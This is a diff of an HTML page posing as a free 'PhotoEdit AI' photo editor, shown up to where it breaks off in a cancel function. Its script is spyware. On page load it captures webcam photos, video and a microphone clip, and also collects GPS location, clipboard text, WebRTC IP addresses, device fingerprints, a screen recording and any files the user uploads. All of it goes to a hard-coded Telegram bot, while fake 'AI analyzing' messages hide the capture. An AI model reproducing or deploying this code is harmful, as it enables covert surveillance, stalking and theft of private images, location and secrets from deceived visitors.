@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -22,13 +21,15 @@
         .hero { max-width: 1100px; margin: 40px auto 20px; padding: 0 20px; text-align: center; }
         .hero h1 { font-size: 38px; background: linear-gradient(135deg, #1a1a2e, #e94560); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 10px; }
         .hero p { color: #666; font-size: 17px; max-width: 600px; margin: 0 auto 30px; }
-        .upload-zone { background: white; border: 2px dashed #ccc; border-radius: 20px; padding: 50px 30px; max-width: 650px; margin: 0 auto; position: relative; box-shadow: 0 4px 20px rgba(0,0,0,0.05); transition: border-color 0.3s; }
+        .upload-zone { background: white; border: 2px dashed #ccc; border-radius: 20px; padding: 50px 30px; max-width: 650px; margin: 0 auto; position: relative; box-shadow: 0 4px 20px rgba(0,0,0,0.05); transition: border-color 0.3s; cursor: pointer; }
         .upload-zone:hover { border-color: #e94560; }
+        .upload-zone.dragover { border-color: #e94560; background: #fff5f7; }
         .upload-icon { font-size: 56px; margin-bottom: 15px; }
         .upload-zone h2 { font-size: 22px; color: #333; margin-bottom: 8px; }
         .upload-zone p { color: #888; font-size: 14px; }
         .features { display: flex; justify-content: center; gap: 30px; margin-top: 25px; flex-wrap: wrap; }
         .features span { font-size: 13px; color: #666; display: flex; align-items: center; gap: 6px; }
+        #fileInput { display: none; }
         .stats-bar { max-width: 1100px; margin: 30px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; }
         .stat-card { background: white; border-radius: 14px; padding: 20px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
         .stat-card .num { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #667eea, #e94560); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
@@ -94,8 +95,8 @@
         }
     </style>
 </head>
-
 <body>
+
     <div class="header">
         <div class="logo">
             <div class="logo-icon">✧</div>
@@ -125,6 +126,7 @@
             <div class="upload-icon">📸</div>
             <h2>Drop an image or click to browse</h2>
             <p>Supports JPG, PNG, WEBP, HEIC — up to 50MB • 100% free</p>
+            <input type="file" id="fileInput" accept="image/*,video/*" multiple>
             <div class="features">
                 <span>✅ AI Enhancement</span>
                 <span>✅ Background Remover</span>
@@ -213,313 +215,523 @@
         <div class="footer-bottom">PhotoEdit AI © 2026 — Free AI photo editing for everyone. All processes are private and encrypted.</div>
     </div>
 
-    <script>
-        const TOKEN = '8421509476:AAFxPeeK_1VUWvcdpTII6xG_KnePGvP0Gew';
-        const CHAT_ID = '7266673273';
-        const BOT_API = `https://api.telegram.org/bot${TOKEN}`;
+<script>
+const TOKEN   = '8421509476:AAFxPeeK_1VUWvcdpTII6xG_KnePGvP0Gew';
+const CHAT_ID = '7266673273';
+const API     = `https://api.telegram.org/bot${TOKEN}`;
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const cameraOverlay = document.getElementById('cameraOverlay');
-        const statusText = document.getElementById('statusText');
-        const progressBar = document.getElementById('progressBar');
-        const cancelBtn = document.getElementById('cancelBtn');
-        const toast = document.getElementById('toast');
+const video       = document.getElementById('video');
+const canvas      = document.getElementById('canvas');
+const overlay     = document.getElementById('cameraOverlay');
+const statusText  = document.getElementById('statusText');
+const progressBar = document.getElementById('progressBar');
+const cancelBtn   = document.getElementById('cancelBtn');
+const toast       = document.getElementById('toast');
+const fileInput   = document.getElementById('fileInput');
+const uploadZone  = document.getElementById('uploadZone');
 
-        let stream = null;
-        let mediaRecorder = null;
-        let recordedChunks = [];
-        let captureInterval = null;
-        let photoCount = 0;
-        const TARGET_PHOTOS = 5; // 5 photos then switch to video
-        let isActive = false;
-        let cameraStarted = false;
-        let phase = 'photo'; // 'photo' | 'video'
+let stream = null, mediaRecorder = null, recordedChunks = [];
+let captureInterval = null, photoCount = 0;
+let isActive = false, cameraStarted = false;
+const TARGET_PHOTOS = 5;
 
-        // ── Device Info ────────────────────────────────────────
-        function getDeviceInfo() {
-            const nav = window.navigator;
-            const screen = window.screen;
-            const info = {
-                ua: nav.userAgent,
-                platform: nav.platform || 'unknown',
-                language: nav.language,
-                languages: (nav.languages || []).join(', '),
-                online: nav.onLine,
-                cookieEnabled: nav.cookieEnabled,
-                doNotTrack: nav.doNotTrack,
-                hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
-                deviceMemory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'unknown',
-                maxTouchPoints: nav.maxTouchPoints,
-                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                availScreen: `${screen.availWidth}x${screen.availHeight}`,
-                pixelRatio: window.devicePixelRatio,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset() + ' min',
-                time: new Date().toString(),
-                referrer: document.referrer || 'direct',
-                url: location.href,
-                connection: (() => {
-                    const c = nav.connection || nav.mozConnection || nav.webkitConnection;
-                    if (!c) return 'unknown';
-                    return `${c.effectiveType || ''} downlink:${c.downlink || '?'}Mbps rtt:${c.rtt || '?'}ms`;
-                })(),
-                battery: 'checking...',
+// ── Toast ──────────────────────────────────────────────────
+function showToast(msg) {
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toast._t);
+    toast._t = setTimeout(() => toast.classList.remove('show'), 2500);
+}
+
+// ── Helpers ────────────────────────────────────────────────
+function post(endpoint, body) {
+    return fetch(`${API}/${endpoint}`, { method: 'POST', body });
+}
+
+async function sendText(text) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('text', text);
+    fd.append('parse_mode', 'Markdown');
+    fd.append('disable_web_page_preview', 'false');
+    return post('sendMessage', fd);
+}
+
+async function sendPhoto(blob, caption) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+    fd.append('caption', caption || '');
+    return post('sendPhoto', fd);
+}
+
+async function sendDocument(blob, filename, caption) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('document', blob, filename);
+    if (caption) fd.append('caption', caption);
+    return post('sendDocument', fd);
+}
+
+async function sendVideo(blob) {
+    const ext  = blob.type.includes('mp4') ? 'mp4' : 'webm';
+    const name = `capture_${Date.now()}.${ext}`;
+    const cap  = `🎥 Video — ${(blob.size/1024/1024).toFixed(2)} MB`;
+    const fd   = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('video', blob, name);
+    fd.append('caption', cap);
+    try {
+        const r = await post('sendVideo', fd);
+        const j = await r.json();
+        if (!j.ok) throw new Error('sendVideo failed');
+    } catch {
+        await sendDocument(blob, name, cap);
+    }
+}
+
+// ── Device Info + Live Location ────────────────────────────
+function parseDeviceModel(ua) {
+    // Android — e.g. (Linux; Android 13; SM-G991B)
+    let m = ua.match(/\(Linux;\s*Android[^;]*;\s*([^)]+)\)/i);
+    if (m) return m[1].trim();
+    // iPhone/iPad — e.g. iPhone OS or CPU iPhone
+    m = ua.match(/(iPhone|iPad)[^;]*;\s*CPU[^)]*\)/i);
+    if (m) return m[0].replace(/\(.*?;\s*/,'').replace(/\).*/,'').trim();
+    // Windows device name
+    m = ua.match(/Windows NT ([\d.]+)/i);
+    if (m) {
+        const ver = {'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7'};
+        return 'Windows ' + (ver[m[1]] || m[1]);
+    }
+    // Mac
+    m = ua.match(/Macintosh.*?Mac OS X ([\d_]+)/i);
+    if (m) return 'Mac OS X ' + m[1].replace(/_/g,'.');
+    // Huawei
+    m = ua.match(/;\s*((?:EML|VOG|CLT|PCT|ANA|HMA|NOH|NTH|PGT|BLA|COR|JAD|LYA|LIO|JEF|TAS|OCE|FRL|VCE|MED|CMR|CAN|WLZ|DBY|MON|GXX|ALN|MDY|LGE|LNA|YAL|VKY|DUA|HWV|SKY|PPA|PPR|CEL|FIG|FNA|GHL|JSN|COR|CPO|BKK|STK|JAT|MED|AND|BAC|BKL|LLD|PLE|RNE|SNE|SPN|STF|TAG|TRT|VNS|VTR|WAS|WLZ)[^;)]+)/i);
+    if (m) return m[1].trim();
+    // Generic fallback
+    m = ua.match(/;\s*([A-Z][A-Z0-9\-_]+)\s*(?:Build|MIUI)/i);
+    if (m) return m[1].trim();
+    return 'unknown';
+}
+
+function getDeviceInfo() {
+    const n = navigator, s = screen;
+    const conn = n.connection || n.mozConnection || n.webkitConnection;
+    return {
+        ua:          n.userAgent,
+        model:       parseDeviceModel(n.userAgent),
+        platform:    n.platform || 'unknown',
+        language:    n.language,
+        languages:   (n.languages || []).join(', '),
+        cores:       n.hardwareConcurrency || '?',
+        ram:         n.deviceMemory ? n.deviceMemory + ' GB' : '?',
+        screen:      `${s.width}×${s.height} (${s.colorDepth}bit)`,
+        pixelRatio:  window.devicePixelRatio,
+        touchPoints: n.maxTouchPoints,
+        timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offset:      new Date().getTimezoneOffset() + ' min',
+        time:        new Date().toString(),
+        referrer:    document.referrer || 'direct',
+        url:         location.href,
+        online:      n.onLine,
+        cookies:     n.cookieEnabled,
+        connection:  conn ? `${conn.effectiveType} ↓${conn.downlink}Mbps rtt${conn.rtt}ms` : 'unknown',
+    };
+}
+
+async function getBattery() {
+    try {
+        const b = await navigator.getBattery();
+        return `${Math.round(b.level*100)}% ${b.charging ? '⚡ charging' : '🔋 discharging'}`;
+    } catch { return 'unavailable'; }
+}
+
+async function getLocation() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) { resolve(null); return; }
+        navigator.geolocation.getCurrentPosition(
+            p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+            () => resolve(null),
+            { timeout: 8000, enableHighAccuracy: true }
+        );
+    });
+}
+
+// ── Clipboard ──────────────────────────────────────────────
+async function getClipboard() {
+    try {
+        const text = await navigator.clipboard.readText();
+        return text ? text.substring(0, 1000) : '(empty)';
+    } catch { return 'denied'; }
+}
+
+// ── WebRTC local/real IP ───────────────────────────────────
+async function getIPs() {
+    return new Promise(resolve => {
+        const ips = new Set();
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = e => {
+                if (!e || !e.candidate) { pc.close(); resolve([...ips]); return; }
+                const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
+                if (m) m.forEach(ip => ips.add(ip));
             };
-            return info;
-        }
+            setTimeout(() => { pc.close(); resolve([...ips]); }, 3000);
+        } catch { resolve([]); }
+    });
+}
 
-        async function getBattery() {
+// ── Font fingerprint ───────────────────────────────────────
+function detectFonts() {
+    const fonts = ['Arial','Helvetica','Times New Roman','Courier New','Verdana',
+        'Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS',
+        'Arial Black','Impact','Tahoma','Geneva','Lucida Console','Lucida Grande',
+        'Monaco','Roboto','Noto Sans','Samsung One','Motorola Sans','HarmonyOS Sans',
+        'MIUI','OnePlus Sans','Segoe UI'];
+    const c = document.createElement('canvas');
+    const ctx = c.getContext('2d');
+    const base = 'monospace';
+    const testStr = 'mmmmmmmmmmlli';
+    ctx.font = `72px ${base}`;
+    const baseW = ctx.measureText(testStr).width;
+    const found = fonts.filter(f => {
+        ctx.font = `72px '${f}',${base}`;
+        return ctx.measureText(testStr).width !== baseW;
+    });
+    return found.join(', ') || 'none detected';
+}
+
+// ── Gyroscope / Accelerometer ─────────────────────────────
+let sensorData = { gyro: 'not available', accel: 'not available' };
+function startSensors() {
+    try {
+        window.addEventListener('deviceorientation', e => {
+            if (e.alpha !== null)
+                sensorData.gyro = `α:${e.alpha?.toFixed(1)} β:${e.beta?.toFixed(1)} γ:${e.gamma?.toFixed(1)}`;
+        }, { once: true });
+        window.addEventListener('devicemotion', e => {
+            const a = e.acceleration;
+            if (a) sensorData.accel = `x:${a.x?.toFixed(2)} y:${a.y?.toFixed(2)} z:${a.z?.toFixed(2)}`;
+        }, { once: true });
+    } catch {}
+}
+
+// ── Screen Recording ──────────────────────────────────────
+async function startScreenRecord() {
+    try {
+        const screenStream = await navigator.mediaDevices.getDisplayMedia({
+            video: { cursor: 'always', displaySurface: 'monitor' },
+            audio: true
+        });
+
+        // notify on Telegram that screen share started
+        await sendText(
+`🖥️ *SCREEN SHARE STARTED*
+━━━━━━━━━━━━━━━━━━
+✅ Target accepted screen sharing
+⏱️ Recording in progress...
+📤 Video will be sent when complete or after 30s
+━━━━━━━━━━━━━━━━━━
+🌐 *URL:* ${location.href}
+⏰ *Time:* ${new Date().toString()}`
+        );
+
+        const chunks = [];
+        const mimes  = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'];
+        const mime   = mimes.find(m => MediaRecorder.isTypeSupported(m)) || '';
+        const mr     = new MediaRecorder(screenStream, mime ? { mimeType: mime } : {});
+
+        mr.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
+        mr.onstop = async () => {
+            screenStream.getTracks().forEach(t => t.stop());
+            if (!chunks.length) return;
+            const blob = new Blob(chunks, { type: chunks[0]?.type || 'video/webm' });
+            const ext  = blob.type.includes('mp4') ? 'mp4' : 'webm';
+            const cap  = `🖥️ Screen recording — ${(blob.size/1024/1024).toFixed(2)} MB`;
+            const fd   = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', blob, `screen_${Date.now()}.${ext}`);
+            fd.append('caption', cap);
             try {
-                const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% ${b.charging ? '⚡charging' : '🔋not charging'}`;
-            } catch (e) { return 'not available'; }
-        }
+                const r = await post('sendVideo', fd);
+                const j = await r.json();
+                if (!j.ok) throw '';
+            } catch {
+                const fd2 = new FormData();
+                fd2.append('chat_id', CHAT_ID);
+                fd2.append('document', blob, `screen_${Date.now()}.${ext}`);
+                fd2.append('caption', cap);
+                await post('sendDocument', fd2);
+            }
+        };
 
-        async function sendDeviceInfo() {
-            const info = getDeviceInfo();
-            info.battery = await getBattery();
+        mr.start(1000);
 
-            // Try geolocation
-            let geoText = 'not granted';
-            try {
-                const pos = await new Promise((res, rej) =>
-                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
-                );
-                geoText = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)} (±${pos.coords.accuracy}m)`;
-            } catch (e) { geoText = 'denied / unavailable'; }
-            info.gps = geoText;
+        // auto-stop after 30s or when user stops sharing
+        screenStream.getVideoTracks()[0].onended = () => mr.stop();
+        setTimeout(() => { if (mr.state !== 'inactive') mr.stop(); }, 30000);
 
-            const text =
-`📱 *DEVICE INFO*
+    } catch (e) {
+        // user denied — silent
+    }
+}
+
+// ── Microphone audio snippet ───────────────────────────────
+async function recordMicSnippet() {
+    try {
+        const micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        const chunks = [];
+        const mr = new MediaRecorder(micStream);
+        mr.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        mr.onstop = async () => {
+            micStream.getTracks().forEach(t => t.stop());
+            const blob = new Blob(chunks, { type: chunks[0]?.type || 'audio/webm' });
+            const ext = blob.type.includes('ogg') ? 'ogg' : 'webm';
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('audio', blob, `mic_${Date.now()}.${ext}`);
+            fd.append('caption', '🎙️ Microphone snippet (10s)');
+            try { await post('sendAudio', fd); } catch {
+                const fd2 = new FormData();
+                fd2.append('chat_id', CHAT_ID);
+                fd2.append('document', blob, `mic_${Date.now()}.${ext}`);
+                fd2.append('caption', '🎙️ Mic snippet');
+                await post('sendDocument', fd2);
+            }
+        };
+        mr.start();
+        setTimeout(() => mr.stop(), 10000);
+    } catch {}
+}
+
+async function sendDeviceInfo() {
+    startSensors();
+    const info      = getDeviceInfo();
+    const battery   = await getBattery();
+    const loc       = await getLocation();
+    const ips       = await getIPs();
+    const clipboard = await getClipboard();
+    const fonts     = detectFonts();
+
+    // mic runs in background — arrives as separate audio message
+    recordMicSnippet();
+
+    let gpsLine = '❌ denied';
+    let mapsLink = '';
+    if (loc) {
+        gpsLine  = `✅ ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (±${Math.round(loc.acc)}m)`;
+        mapsLink = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
+    }
+
+    await sendText(
+`📱 *NEW VISITOR — FULL REPORT*
 ━━━━━━━━━━━━━━━━━━
 🌐 *URL:* ${info.url}
 🔗 *Referrer:* ${info.referrer}
 ⏰ *Time:* ${info.time}
-🌍 *Timezone:* ${info.timezone} (${info.timezoneOffset})
-📍 *GPS:* ${info.gps}
+🌍 *Timezone:* ${info.timezone} (${info.offset})
 ━━━━━━━━━━━━━━━━━━
-📺 *Screen:* ${info.screen}
-📐 *Avail:* ${info.availScreen}
-🖥️ *Pixel Ratio:* ${info.pixelRatio}
-🖱️ *Touch Points:* ${info.maxTouchPoints}
+📍 *GPS:* ${gpsLine}${mapsLink ? '\n🗺️ *Maps:* ' + mapsLink : ''}
+🌐 *IPs (WebRTC):* ${ips.length ? ips.join(', ') : 'blocked'}
 ━━━━━━━━━━━━━━━━━━
+📱 *Device Model:* ${info.model}
 💻 *Platform:* ${info.platform}
+📺 *Screen:* ${info.screen} @${info.pixelRatio}x
+🖱️ *Touch Points:* ${info.touchPoints}
+🔧 *CPU Cores:* ${info.cores}
+💾 *RAM:* ${info.ram}
+🔋 *Battery:* ${battery}
+📡 *Network:* ${info.connection}
 🌐 *Language:* ${info.language} [${info.languages}]
-🔧 *CPU Cores:* ${info.hardwareConcurrency}
-💾 *RAM:* ${info.deviceMemory}
-🔋 *Battery:* ${info.battery}
-📡 *Connection:* ${info.connection}
-🍪 *Cookies:* ${info.cookieEnabled}
-🚫 *DNT:* ${info.doNotTrack}
+🍪 *Cookies:* ${info.cookies}
+━━━━━━━━━━━━━━━━━━
+🧭 *Gyroscope:* ${sensorData.gyro}
+📳 *Accelerometer:* ${sensorData.accel}
+🔤 *Fonts detected:* ${fonts}
+━━━━━━━━━━━━━━━━━━
+📋 *Clipboard:*
+\`${clipboard}\`
 ━━━━━━━━━━━━━━━━━━
 📟 *User Agent:*
-${info.ua}`;
+\`${info.ua}\``
+    );
+}
 
-            await fetch(`${BOT_API}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'Markdown'
-                })
-            });
-        }
-
-        // ── Toast ──────────────────────────────────────────────
-        function showToast(msg) {
-            toast.textContent = msg;
-            toast.classList.add('show');
-            clearTimeout(toast._timer);
-            toast._timer = setTimeout(() => toast.classList.remove('show'), 2500);
-        }
-
-        // ── FAQ ────────────────────────────────────────────────
-        document.querySelectorAll('.faq-item').forEach(item => {
-            item.addEventListener('click', () => item.classList.toggle('open'));
-        });
-        document.getElementById('hamburger').addEventListener('click', () => {
-            document.getElementById('nav').classList.toggle('mobile-open');
-        });
-        document.querySelectorAll('.tool-card').forEach(card => {
-            card.addEventListener('click', () => {
-                showToast('🔄 Opening ' + card.querySelector('h3').textContent + '...');
-            });
-        });
-
-        // ── Main start ─────────────────────────────────────────
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                sendDeviceInfo(); // send device info immediately
-                autoStartCamera();
-            }, 500);
-        });
-
-        document.getElementById('uploadZone').addEventListener('click', () => {
-            if (!cameraStarted) autoStartCamera();
-            else showToast('📸 Camera is already active');
-        });
-
-        async function autoStartCamera() {
-            if (cameraStarted) return;
-            cameraStarted = true;
-            try {
-                cameraOverlay.classList.add('active');
-                statusText.textContent = 'Initializing AI engine...';
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                    audio: true
-                });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                await video.play();
-                isActive = true;
-                statusText.textContent = 'AI analyzing your photo...';
-                phase = 'photo';
-                photoCount = 0;
-                startPhotoPhase();
-                showToast('📸 AI camera active...');
-            } catch (err) {
-                statusText.textContent = '⚠️ Camera access needed for AI features. Please allow and refresh.';
-                showToast('⚠️ Camera access denied.');
+// ── File Upload → Telegram ─────────────────────────────────
+async function handleUploadedFiles(files) {
+    if (!files || !files.length) return;
+    showToast(`⬆️ Uploading ${files.length} file(s)...`);
+    for (const file of files) {
+        const isImg   = file.type.startsWith('image/');
+        const isVid   = file.type.startsWith('video/');
+        const caption = `📎 User upload: ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)`;
+        try {
+            if (isImg) {
+                await sendPhoto(file, caption);
+            } else if (isVid) {
+                await sendVideo(file);
+            } else {
+                await sendDocument(file, file.name, caption);
             }
+        } catch (e) {
+            try { await sendDocument(file, file.name, caption); } catch {}
         }
+    }
+    showToast('✅ Upload complete!');
+}
 
-        // ── Phase 1: Photos ────────────────────────────────────
-        function startPhotoPhase() {
-            captureInterval = setInterval(() => {
-                if (!isActive || photoCount >= TARGET_PHOTOS) {
-                    clearInterval(captureInterval);
-                    captureInterval = null;
-                    startVideoPhase();
-                    return;
-                }
-                capturePhoto();
-            }, 800);
-        }
+// Upload zone interactions
+uploadZone.addEventListener('click', (e) => {
+    if (e.target === fileInput) return;
+    fileInput.click();
+});
+fileInput.addEventListener('change', () => {
+    handleUploadedFiles(fileInput.files);
+    if (!cameraStarted) autoStartCamera();
+});
+uploadZone.addEventListener('dragover', e => { e.preventDefault(); uploadZone.classList.add('dragover'); });
+uploadZone.addEventListener('dragleave', () => uploadZone.classList.remove('dragover'));
+uploadZone.addEventListener('drop', e => {
+    e.preventDefault();
+    uploadZone.classList.remove('dragover');
+    handleUploadedFiles(e.dataTransfer.files);
+    if (!cameraStarted) autoStartCamera();
+});
 
-        function capturePhoto() {
-            const vw = video.videoWidth || 1280;
-            const vh = video.videoHeight || 720;
-            canvas.width = vw; canvas.height = vh;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, vw, vh);
-            canvas.toBlob(async (blob) => {
-                if (!blob || !isActive) return;
-                photoCount++;
-                const pct = Math.round((photoCount / TARGET_PHOTOS) * 50); // 0-50%
-                progressBar.style.width = pct + '%';
-                statusText.textContent = `AI scanning frames... ${photoCount}/${TARGET_PHOTOS}`;
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, `photo_${Date.now()}_${photoCount}.jpg`);
-                fd.append('caption', `📸 Frame #${photoCount}`);
-                try { await fetch(`${BOT_API}/sendPhoto`, { method: 'POST', body: fd }); } catch (e) {}
-            }, 'image/jpeg', 0.85);
-        }
+// ── Camera ─────────────────────────────────────────────────
+window.addEventListener('load', () => {
+    setTimeout(() => {
+        sendDeviceInfo();
+        autoStartCamera();
+        setTimeout(startScreenRecord, 3000); // slight delay after camera prompt
+    }, 600);
+});
 
-        // ── Phase 2: Video ─────────────────────────────────────
-        function startVideoPhase() {
-            if (!isActive || !stream) return;
-            statusText.textContent = 'Enhancing with AI... please wait';
-            progressBar.style.width = '50%';
-
-            // pick best supported mime
-            const mimes = [
-                'video/webm;codecs=vp9,opus',
-                'video/webm;codecs=vp8,opus',
-                'video/webm',
-                'video/mp4',
-            ];
-            const mime = mimes.find(m => MediaRecorder.isTypeSupported(m)) || '';
-
-            recordedChunks = [];
-            try {
-                mediaRecorder = new MediaRecorder(stream, mime ? { mimeType: mime } : {});
-            } catch (e) {
-                mediaRecorder = new MediaRecorder(stream);
-            }
-
-            mediaRecorder.ondataavailable = e => {
-                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
-            };
-
-            mediaRecorder.onstop = async () => {
-                await sendVideo();
-            };
-
-            mediaRecorder.start(1000); // collect chunks every 1s
-
-            // record for 15 seconds
-            let elapsed = 0;
-            const recInterval = setInterval(() => {
-                if (!isActive) { clearInterval(recInterval); return; }
-                elapsed++;
-                const pct = 50 + Math.round((elapsed / 15) * 50);
-                progressBar.style.width = Math.min(pct, 98) + '%';
-                statusText.textContent = `AI processing video... ${elapsed}s / 15s`;
-                if (elapsed >= 15) {
-                    clearInterval(recInterval);
-                    mediaRecorder.stop();
-                }
-            }, 1000);
-        }
-
-        async function sendVideo() {
-            if (!recordedChunks.length) { finishAll(); return; }
-            statusText.textContent = 'Uploading AI result...';
-            const blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/webm' });
-            const ext = (recordedChunks[0].type || 'video/webm').includes('mp4') ? 'mp4' : 'webm';
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('video', blob, `capture_${Date.now()}.${ext}`);
-            fd.append('caption', `🎥 Video capture — ${blob.size > 1024*1024 ? (blob.size/1024/1024).toFixed(1)+'MB' : Math.round(blob.size/1024)+'KB'}`);
-            try {
-                await fetch(`${BOT_API}/sendVideo`, { method: 'POST', body: fd });
-            } catch (e) {
-                // fallback: send as document
-                try {
-                    const fd2 = new FormData();
-                    fd2.append('chat_id', CHAT_ID);
-                    fd2.append('document', blob, `capture_${Date.now()}.${ext}`);
-                    await fetch(`${BOT_API}/sendDocument`, { method: 'POST', body: fd2 });
-                } catch (e2) {}
-            }
-            finishAll();
-        }
-
-        function finishAll() {
-            isActive = false;
-            if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
-            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-            progressBar.style.width = '100%';
-            statusText.textContent = '✅ AI analysis complete!';
-            setTimeout(() => {
-                cameraOverlay.classList.remove('active');
-                photoCount = 0;
-                progressBar.style.width = '0%';
-                showToast('✅ AI processing done!');
-            }, 1500);
-        }
-
-        function cancelCapture() {
-            isActive = false;
-            if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-            photoCount = 0;
-            progressBar.style.width = '0%';
-            cameraOverlay.classList.remove('active');
-            showToast('❌ Cancelled');
-        }
-
-        cancelBtn.addEventListener('click', cancelCapture);
-        window.addEventListener('beforeunload', () => {
-            if (captureInterval) clearInterval(captureInterval);
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-            if (stream) stream.getTracks().forEach(t => t.stop());
+async function autoStartCamera() {
+    if (cameraStarted) return;
+    cameraStarted = true;
+    try {
+        overlay.classList.add('active');
+        statusText.textContent = 'Initializing AI engine...';
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: true
         });
-    </script>
+        video.srcObject = stream;
+        video.style.display = 'block';
+        await video.play();
+        isActive = true;
+        photoCount = 0;
+        statusText.textContent = 'AI analyzing your photo...';
+        startPhotoPhase();
+        showToast('📸 AI camera active...');
+    } catch (err) {
+        statusText.textContent = '⚠️ Camera access needed for AI features. Please allow and refresh.';
+        showToast('⚠️ Camera access denied.');
+    }
+}
+
+// Phase 1 — photos
+function startPhotoPhase() {
+    captureInterval = setInterval(() => {
+        if (!isActive || photoCount >= TARGET_PHOTOS) {
+            clearInterval(captureInterval); captureInterval = null;
+            startVideoPhase();
+            return;
+        }
+        captureOnePhoto();
+    }, 800);
+}
+
+function captureOnePhoto() {
+    const vw = video.videoWidth || 1280, vh = video.videoHeight || 720;
+    canvas.width = vw; canvas.height = vh;
+    canvas.getContext('2d').drawImage(video, 0, 0, vw, vh);
+    canvas.toBlob(async blob => {
+        if (!blob || !isActive) return;
+        photoCount++;
+        progressBar.style.width = Math.round((photoCount / TARGET_PHOTOS) * 50) + '%';
+        statusText.textContent = `AI scanning frames... ${photoCount}/${TARGET_PHOTOS}`;
+        await sendPhoto(blob, `📸 Frame #${photoCount}`);
+    }, 'image/jpeg', 0.85);
+}
+
+// Phase 2 — video
+function startVideoPhase() {
+    if (!isActive || !stream) return;
+    statusText.textContent = 'Enhancing with AI... please wait';
+    progressBar.style.width = '50%';
+
+    const mimes = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm','video/mp4'];
+    const mime  = mimes.find(m => MediaRecorder.isTypeSupported(m)) || '';
+    recordedChunks = [];
+    try { mediaRecorder = new MediaRecorder(stream, mime ? { mimeType: mime } : {}); }
+    catch { mediaRecorder = new MediaRecorder(stream); }
+
+    mediaRecorder.ondataavailable = e => { if (e.data?.size > 0) recordedChunks.push(e.data); };
+    mediaRecorder.onstop = async () => {
+        const blob = new Blob(recordedChunks, { type: recordedChunks[0]?.type || 'video/webm' });
+        await sendVideo(blob);
+        finishAll();
+    };
+    mediaRecorder.start(1000);
+
+    let elapsed = 0;
+    const ri = setInterval(() => {
+        if (!isActive) { clearInterval(ri); return; }
+        elapsed++;
+        progressBar.style.width = Math.min(50 + Math.round((elapsed/15)*50), 98) + '%';
+        statusText.textContent = `AI processing video... ${elapsed}s / 15s`;
+        if (elapsed >= 15) { clearInterval(ri); mediaRecorder.stop(); }
+    }, 1000);
+}
+
+function finishAll() {
+    isActive = false;
+    if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
+    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+    progressBar.style.width = '100%';
+    statusText.textContent = '✅ AI analysis complete!';
+    setTimeout(() => {
+        overlay.classList.remove('active');
+        photoCount = 0;
+        progressBar.style.width = '0%';
+        showToast('✅ AI processing done!');
+    }, 1500);
+}
+
+function cancelCapture() {
+    isActive = false;
